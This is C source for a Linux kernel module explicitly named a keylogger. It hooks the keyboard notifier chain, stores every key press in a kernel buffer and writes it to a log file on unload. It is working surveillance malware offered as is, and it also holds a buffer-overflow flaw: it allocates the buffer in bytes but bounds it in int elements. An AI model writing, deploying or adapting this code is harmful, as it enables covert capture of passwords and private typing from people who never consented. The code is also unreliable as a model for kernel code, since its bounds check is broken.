#include "keylogger.h"

int * buffer;
int flag;
int * bptr;
int * endptr;
long buf_length;

struct file * fp;
mm_segment_t fs;
loff_t pos;

int keylogger_init(void) {
    buf_length = LOG_MAX_SIZE;
    buffer = kmalloc(buf_length, GFP_KERNEL);
    bptr = buffer;
    endptr = buffer + buf_length;
    register_keyboard_notifier(&nb);
    memset(buffer, 0, buf_length);
    return 0;
}

void keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    save_buffer();
    memset(buffer, 0, buf_length);
    kfree(buffer);
    bptr = buffer;
}

int save_buffer()
{
    fp = filp_open(LOG_FILE_PATH, O_RDWR | O_CREAT | O_APPEND, 0600);
    if (IS_ERR(fp)) {
        return -1;
    }
    pos = 0;
    fs = get_fs();
    set_fs(KERNEL_DS);
    vfs_write(fp, (const char *)buffer, (bptr-buffer)*sizeof(int), &pos);
    vfs_fsync(fp, 0);
    filp_close(fp, NULL);
    set_fs(fs);
    return 0;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param *param = _param;
    if(flag)
        return NOTIFY_OK;
    if(code == KBD_KEYCODE && param->down) {
        int key = param->value;
        *bptr = key;
        bptr++;
        if(bptr == endptr)
        {
            flag = 1;
        }
    }
    return NOTIFY_OK;
}

MODULE_LICENSE("GPL");
module_init(keylogger_init);
module_exit(keylogger_exit);
